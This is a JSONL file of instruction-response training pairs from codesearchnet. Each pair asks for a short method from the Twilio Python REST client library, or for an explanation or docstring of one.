{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a new ModelBuildInstance", "response": "def create(self, status_callback=values.unset, unique_name=values.unset):\n        \"\"\"\n        Create a new ModelBuildInstance\n\n        :param unicode status_callback: The URL we should call using a POST method to send status information to your application\n        :param unicode unique_name: An application-defined string that uniquely identifies the new resource\n\n        :returns: Newly created ModelBuildInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.model_build.ModelBuildInstance\n        \"\"\"\n        data = values.of({'StatusCallback': status_callback, 'UniqueName': unique_name, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ModelBuildInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self, sid):\n        return ModelBuildContext(self._version, assistant_sid=self._solution['assistant_sid'], sid=sid, )", "response": "Constructs a ModelBuildContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.autopilot.v1.assistant.model_build.ModelBuildContext\n        :rtype: twilio.rest.autopilot.v1.assistant.model_build.ModelBuildContext"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_instance(self, payload):\n        return ModelBuildInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )", "response": "Build an instance of ModelBuildInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ModelBuildContext for this ModelBuildInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.model_build.ModelBuildContext\n        \"\"\"\n        if self._context is None:\n            self._context = ModelBuildContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the ModelBuildInstance resource", "response": "def update(self, unique_name=values.unset):\n        \"\"\"\n        Update the ModelBuildInstance\n\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n\n        :returns: Updated ModelBuildInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.model_build.ModelBuildInstance\n        \"\"\"\n        return self._proxy.update(unique_name=unique_name, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncreates a new CredentialInstance", "response": "def create(self, username, password):\n        \"\"\"\n        Create a new CredentialInstance\n\n        :param unicode username: The username for this credential.\n        :param unicode password: The password will not be returned in the response.\n\n        :returns: Newly created CredentialInstance\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialInstance\n        \"\"\"\n        data = values.of({'Username': username, 'Password': password, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CredentialInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            credential_list_sid=self._solution['credential_list_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self, sid):\n        return CredentialContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            credential_list_sid=self._solution['credential_list_sid'],\n            sid=sid,\n        )", "response": "Constructs a CredentialContext\n\n        :param sid: The unique id that identifies the resource to fetch.\n\n        :returns: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialContext\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialContext"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nbuilding an instance of CredentialInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of CredentialInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialInstance\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialInstance\n        \"\"\"\n        return CredentialInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            credential_list_sid=self._solution['credential_list_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, password=values.unset):\n        data = values.of({'Password': password, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CredentialInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            credential_list_sid=self._solution['credential_list_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the CredentialInstance\n\n        :param unicode password: The password will not be returned in the response\n\n        :returns: Updated CredentialInstance\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating an instance context for the credential_list_credential.", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CredentialContext for this CredentialInstance\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialContext\n        \"\"\"\n        if self._context is None:\n            self._context = CredentialContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                credential_list_sid=self._solution['credential_list_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, password=values.unset):\n        return self._proxy.update(password=password, )", "response": "Update the CredentialInstance\n\n        :param unicode password: The password will not be returned in the response\n\n        :returns: Updated CredentialInstance\n        :rtype: twilio.rest.api.v2010.account.sip.credential_list.credential.CredentialInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new FeedbackSummaryInstance", "response": "def create(self, start_date, end_date, include_subaccounts=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset):\n        \"\"\"\n        Create a new FeedbackSummaryInstance\n\n        :param date start_date: Only include feedback given on or after this date\n        :param date end_date: Only include feedback given on or before this date\n        :param bool include_subaccounts: `true` includes feedback from the specified account and its subaccounts\n        :param unicode status_callback: The URL that we will request when the feedback summary is complete\n        :param unicode status_callback_method: The HTTP method we use to make requests to the StatusCallback URL\n\n        :returns: Newly created FeedbackSummaryInstance\n        :rtype: twilio.rest.api.v2010.account.call.feedback_summary.FeedbackSummaryInstance\n        \"\"\"\n        data = values.of({\n            'StartDate': serialize.iso8601_date(start_date),\n            'EndDate': serialize.iso8601_date(end_date),\n            'IncludeSubaccounts': include_subaccounts,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FeedbackSummaryInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, sid):\n        return FeedbackSummaryContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a FeedbackSummaryContext\n\n        :param sid: A string that uniquely identifies this feedback summary resource\n\n        :returns: twilio.rest.api.v2010.account.call.feedback_summary.FeedbackSummaryContext\n        :rtype: twilio.rest.api.v2010.account.call.feedback_summary.FeedbackSummaryContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return FeedbackSummaryInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of FeedbackSummaryInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = FeedbackSummaryContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the crawler"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, sid):\n        return RoomRecordingContext(self._version, room_sid=self._solution['room_sid'], sid=sid, )", "response": "Constructs a RoomRecordingContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.video.v1.room.recording.RoomRecordingContext\n        :rtype: twilio.rest.video.v1.room.recording.RoomRecordingContext"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild an instance of RoomRecordingInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of RoomRecordingInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.video.v1.room.recording.RoomRecordingInstance\n        :rtype: twilio.rest.video.v1.room.recording.RoomRecordingInstance\n        \"\"\"\n        return RoomRecordingInstance(self._version, payload, room_sid=self._solution['room_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = RoomRecordingContext(\n                self._version,\n                room_sid=self._solution['room_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the room_recording_instance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef countries(self):\n        if self._countries is None:\n            self._countries = CountryList(self._version, )\n        return self._countries", "response": "Access the countries\n\n        :returns: twilio.rest.voice.v1.dialing_permissions.country.CountryList\n        :rtype: twilio.rest.voice.v1.dialing_permissions.country.CountryList"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef settings(self):\n        if self._settings is None:\n            self._settings = SettingsList(self._version, )\n        return self._settings", "response": "Access the settings list that is indexed by locale code"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef bulk_country_updates(self):\n        if self._bulk_country_updates is None:\n            self._bulk_country_updates = BulkCountryUpdateList(self._version, )\n        return self._bulk_country_updates", "response": "Access the bulk_country_updates\n\n        :returns: twilio.rest.voice.v1.dialing_permissions.bulk_country_update.BulkCountryUpdateList\n        :rtype: twilio.rest.voice.v1.dialing_permissions.bulk_country_update.BulkCountryUpdateList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding an instance of DependentPhoneNumberInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of DependentPhoneNumberInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.address.dependent_phone_number.DependentPhoneNumberInstance\n        :rtype: twilio.rest.api.v2010.account.address.dependent_phone_number.DependentPhoneNumberInstance\n        \"\"\"\n        return DependentPhoneNumberInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            address_sid=self._solution['address_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create(self, name, code_length=values.unset):\n        data = values.of({'Name': name, 'CodeLength': code_length, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, )", "response": "Create a new ServiceInstance with the given name and verification code length."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the verifications :returns: twilio.rest.preview.acc_security.service.verification.VerificationList :rtype: twilio.rest.preview.acc_security.service.verification.VerificationList", "response": "def verifications(self):\n        \"\"\"\n        Access the verifications\n\n        :returns: twilio.rest.preview.acc_security.service.verification.VerificationList\n        :rtype: twilio.rest.preview.acc_security.service.verification.VerificationList\n        \"\"\"\n        if self._verifications is None:\n            self._verifications = VerificationList(self._version, service_sid=self._solution['sid'], )\n        return self._verifications"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the verification_checks :returns: twilio.rest.preview.acc_security.service.verification_check.VerificationCheckList :rtype: twilio.rest.preview.acc_security.service.verification_check.VerificationCheckList", "response": "def verification_checks(self):\n        \"\"\"\n        Access the verification_checks\n\n        :returns: twilio.rest.preview.acc_security.service.verification_check.VerificationCheckList\n        :rtype: twilio.rest.preview.acc_security.service.verification_check.VerificationCheckList\n        \"\"\"\n        if self._verification_checks is None:\n            self._verification_checks = VerificationCheckList(self._version, service_sid=self._solution['sid'], )\n        return self._verification_checks"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = ServiceContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the instance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, name=values.unset, code_length=values.unset):\n        return self._proxy.update(name=name, code_length=code_length, )", "response": "Update the ServiceInstance\n\n        :param unicode name: Friendly name of the service\n        :param unicode code_length: Length of verification code. Valid values are 4-10\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.preview.acc_security.service.ServiceInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the extensions :returns: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionList :rtype: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionList", "response": "def extensions(self):\n        \"\"\"\n        Access the extensions\n\n        :returns: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionList\n        :rtype: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionList\n        \"\"\"\n        if self._extensions is None:\n            self._extensions = AvailableAddOnExtensionList(\n                self._version,\n                available_add_on_sid=self._solution['sid'],\n            )\n        return self._extensions"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = AvailableAddOnContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the available add on"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self):\n        return FeedbackContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            call_sid=self._solution['call_sid'],\n        )", "response": "Constructs a FeedbackContext\n\n        :returns: twilio.rest.api.v2010.account.call.feedback.FeedbackContext\n        :rtype: twilio.rest.api.v2010.account.call.feedback.FeedbackContext"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild an instance of FeedbackInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of FeedbackInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.call.feedback.FeedbackInstance\n        :rtype: twilio.rest.api.v2010.account.call.feedback.FeedbackInstance\n        \"\"\"\n        return FeedbackInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            call_sid=self._solution['call_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new FeedbackInstance", "response": "def create(self, quality_score, issue=values.unset):\n        \"\"\"\n        Create a new FeedbackInstance\n\n        :param unicode quality_score: The call quality expressed as an integer from 1 to 5\n        :param FeedbackInstance.Issues issue: Issues experienced during the call\n\n        :returns: Newly created FeedbackInstance\n        :rtype: twilio.rest.api.v2010.account.call.feedback.FeedbackInstance\n        \"\"\"\n        data = values.of({'QualityScore': quality_score, 'Issue': serialize.map(issue, lambda e: e), })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FeedbackInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            call_sid=self._solution['call_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfetches a FeedbackInstance :returns: Fetched FeedbackInstance :rtype: twilio.rest.api.v2010.account.call.feedback.FeedbackInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a FeedbackInstance\n\n        :returns: Fetched FeedbackInstance\n        :rtype: twilio.rest.api.v2010.account.call.feedback.FeedbackInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return FeedbackInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            call_sid=self._solution['call_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates an instance context for the crawler", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: FeedbackContext for this FeedbackInstance\n        :rtype: twilio.rest.api.v2010.account.call.feedback.FeedbackContext\n        \"\"\"\n        if self._context is None:\n            self._context = FeedbackContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                call_sid=self._solution['call_sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, quality_score, issue=values.unset):\n        return self._proxy.create(quality_score, issue=issue, )", "response": "Create a new FeedbackInstance with the given quality score and issue."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the FeedbackInstance with the specified quality score.", "response": "def update(self, quality_score, issue=values.unset):\n        \"\"\"\n        Update the FeedbackInstance\n\n        :param unicode quality_score: The call quality expressed as an integer from 1 to 5\n        :param FeedbackInstance.Issues issue: Issues experienced during the call\n\n        :returns: Updated FeedbackInstance\n        :rtype: twilio.rest.api.v2010.account.call.feedback.FeedbackInstance\n        \"\"\"\n        return self._proxy.update(quality_score, issue=issue, )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list(self, beta=values.unset, friendly_name=values.unset,\n             phone_number=values.unset, origin=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists MobileInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param bool beta: Whether to include new phone numbers\n        :param unicode friendly_name: A string that identifies the resources to read\n        :param unicode phone_number: The phone numbers of the resources to read\n        :param unicode origin: Include phone numbers based on their origin. By default, phone numbers of all origin are included.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.incoming_phone_number.mobile.MobileInstance]\n        \"\"\"\n        return list(self.stream(\n            beta=beta,\n            friendly_name=friendly_name,\n            phone_number=phone_number,\n            origin=origin,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams MobileInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return MobileInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of MobileInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, unique_name, default_ttl=values.unset,\n               callback_url=values.unset, geo_match_level=values.unset,\n               number_selection_behavior=values.unset,\n               intercept_callback_url=values.unset,\n               out_of_session_callback_url=values.unset,\n               chat_instance_sid=values.unset):\n        \"\"\"\n        Create a new ServiceInstance\n\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n        :param unicode default_ttl: Default TTL for a Session, in seconds\n        :param unicode callback_url: The URL we should call when the interaction status changes\n        :param ServiceInstance.GeoMatchLevel geo_match_level: Where a proxy number must be located relative to the participant identifier\n        :param ServiceInstance.NumberSelectionBehavior number_selection_behavior: The preference for Proxy Number selection for the Service instance\n        :param unicode intercept_callback_url: The URL we call on each interaction\n        :param unicode out_of_session_callback_url: The URL we call when an inbound call or SMS action occurs on a closed or non-existent Session\n        :param unicode chat_instance_sid: The SID of the Chat Service Instance\n\n        :returns: Newly created ServiceInstance\n        :rtype: twilio.rest.proxy.v1.service.ServiceInstance\n        \"\"\"\n        data = values.of({\n            'UniqueName': unique_name,\n            'DefaultTtl': default_ttl,\n            'CallbackUrl': callback_url,\n            'GeoMatchLevel': geo_match_level,\n            'NumberSelectionBehavior': number_selection_behavior,\n            'InterceptCallbackUrl': intercept_callback_url,\n            'OutOfSessionCallbackUrl': out_of_session_callback_url,\n            'ChatInstanceSid': chat_instance_sid,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, )", "response": "Create a new ServiceInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef sessions(self):\n        if self._sessions is None:\n            self._sessions = SessionList(self._version, service_sid=self._solution['sid'], )\n        return self._sessions", "response": "Access the sessions\n\n        :returns: twilio.rest.proxy.v1.service.session.SessionList\n        :rtype: twilio.rest.proxy.v1.service.session.SessionList"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\naccesses the phone_numbers :returns: twilio.rest.proxy.v1.service.phone_number.PhoneNumberList :rtype: twilio.rest.proxy.v1.service.phone_number.PhoneNumberList", "response": "def phone_numbers(self):\n        \"\"\"\n        Access the phone_numbers\n\n        :returns: twilio.rest.proxy.v1.service.phone_number.PhoneNumberList\n        :rtype: twilio.rest.proxy.v1.service.phone_number.PhoneNumberList\n        \"\"\"\n        if self._phone_numbers is None:\n            self._phone_numbers = PhoneNumberList(self._version, service_sid=self._solution['sid'], )\n        return self._phone_numbers"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the short_codes :returns: twilio.rest.proxy.v1.service.short_code.ShortCodeList :rtype: twilio.rest.proxy.v1.service.short_code.ShortCodeList", "response": "def short_codes(self):\n        \"\"\"\n        Access the short_codes\n\n        :returns: twilio.rest.proxy.v1.service.short_code.ShortCodeList\n        :rtype: twilio.rest.proxy.v1.service.short_code.ShortCodeList\n        \"\"\"\n        if self._short_codes is None:\n            self._short_codes = ShortCodeList(self._version, service_sid=self._solution['sid'], )\n        return self._short_codes"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self, unique_name=values.unset, default_ttl=values.unset,\n               callback_url=values.unset, geo_match_level=values.unset,\n               number_selection_behavior=values.unset,\n               intercept_callback_url=values.unset,\n               out_of_session_callback_url=values.unset,\n               chat_instance_sid=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n        :param unicode default_ttl: Default TTL for a Session, in seconds\n        :param unicode callback_url: The URL we should call when the interaction status changes\n        :param ServiceInstance.GeoMatchLevel geo_match_level: Where a proxy number must be located relative to the participant identifier\n        :param ServiceInstance.NumberSelectionBehavior number_selection_behavior: The preference for Proxy Number selection for the Service instance\n        :param unicode intercept_callback_url: The URL we call on each interaction\n        :param unicode out_of_session_callback_url: The URL we call when an inbound call or SMS action occurs on a closed or non-existent Session\n        :param unicode chat_instance_sid: The SID of the Chat Service Instance\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.proxy.v1.service.ServiceInstance\n        \"\"\"\n        return self._proxy.update(\n            unique_name=unique_name,\n            default_ttl=default_ttl,\n            callback_url=callback_url,\n            geo_match_level=geo_match_level,\n            number_selection_behavior=number_selection_behavior,\n            intercept_callback_url=intercept_callback_url,\n            out_of_session_callback_url=out_of_session_callback_url,\n            chat_instance_sid=chat_instance_sid,\n        )", "response": "Update the ServiceInstance s Information"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the country", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CountryContext for this CountryInstance\n        :rtype: twilio.rest.pricing.v2.voice.country.CountryContext\n        \"\"\"\n        if self._context is None:\n            self._context = CountryContext(self._version, iso_country=self._solution['iso_country'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fetch(self, ui_version=values.unset):\n        params = values.of({'UiVersion': ui_version, })\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ConfigurationInstance(self._version, payload, )", "response": "Fetch a ConfigurationInstance\n\n        :param unicode ui_version: Pinned UI version\n\n        :returns: Fetched ConfigurationInstance\n        :rtype: twilio.rest.flex_api.v1.configuration.ConfigurationInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create(self):\n        data = values.of({})\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ConfigurationInstance(self._version, payload, )", "response": "Create a new ConfigurationInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _proxy(self):\n        if self._context is None:\n            self._context = ConfigurationContext(self._version, )\n        return self._context", "response": "Generate an instance context for the configuration"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fetch(self, ui_version=values.unset):\n        return self._proxy.fetch(ui_version=ui_version, )", "response": "Fetch a ConfigurationInstance\n\n        :param unicode ui_version: Pinned UI version\n\n        :returns: Fetched ConfigurationInstance\n        :rtype: twilio.rest.flex_api.v1.configuration.ConfigurationInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding an instance of LastMonthInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of LastMonthInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.usage.record.last_month.LastMonthInstance\n        :rtype: twilio.rest.api.v2010.account.usage.record.last_month.LastMonthInstance\n        \"\"\"\n        return LastMonthInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create(self, unique_name=values.unset, data=values.unset):\n        data = values.of({'UniqueName': unique_name, 'Data': serialize.object(data), })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DocumentInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new DocumentInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return DocumentContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a DocumentContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.preview.sync.service.document.DocumentContext\n        :rtype: twilio.rest.preview.sync.service.document.DocumentContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return DocumentInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of DocumentInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, data):\n        data = values.of({'Data': serialize.object(data), })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DocumentInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the DocumentInstance\n\n        :param dict data: The data\n\n        :returns: Updated DocumentInstance\n        :rtype: twilio.rest.preview.sync.service.document.DocumentInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\naccesses the document_permissions :returns: twilio.rest.preview.sync.service.document.document_permission.DocumentPermissionList :rtype: twilio.rest.preview.sync.service.document.document_permission.DocumentPermissionList", "response": "def document_permissions(self):\n        \"\"\"\n        Access the document_permissions\n\n        :returns: twilio.rest.preview.sync.service.document.document_permission.DocumentPermissionList\n        :rtype: twilio.rest.preview.sync.service.document.document_permission.DocumentPermissionList\n        \"\"\"\n        if self._document_permissions is None:\n            self._document_permissions = DocumentPermissionList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                document_sid=self._solution['sid'],\n            )\n        return self._document_permissions"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = DocumentContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef v2(self):\n        if self._v2 is None:\n            self._v2 = V2(self)\n        return self._v2", "response": "Access the V2 Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create(self, attributes=values.unset, twilio_address=values.unset,\n               date_created=values.unset, date_updated=values.unset,\n               identity=values.unset, user_address=values.unset):\n        \"\"\"\n        Create a new ParticipantInstance\n\n        :param unicode attributes: An optional string metadata field you can use to store any data you wish.\n        :param unicode twilio_address: The address of the Twilio phone number that the participant is in contact with.\n        :param datetime date_created: The date that this resource was created.\n        :param datetime date_updated: The date that this resource was last updated.\n        :param unicode identity: A unique string identifier for the session participant as Chat User.\n        :param unicode user_address: The address of the participant's device.\n\n        :returns: Newly created ParticipantInstance\n        :rtype: twilio.rest.messaging.v1.session.participant.ParticipantInstance\n        \"\"\"\n        data = values.of({\n            'Identity': identity,\n            'UserAddress': user_address,\n            'Attributes': attributes,\n            'TwilioAddress': twilio_address,\n            'DateCreated': serialize.iso8601_datetime(date_created),\n            'DateUpdated': serialize.iso8601_datetime(date_updated),\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ParticipantInstance(self._version, payload, session_sid=self._solution['session_sid'], )", "response": "Create a new ParticipantInstance"}
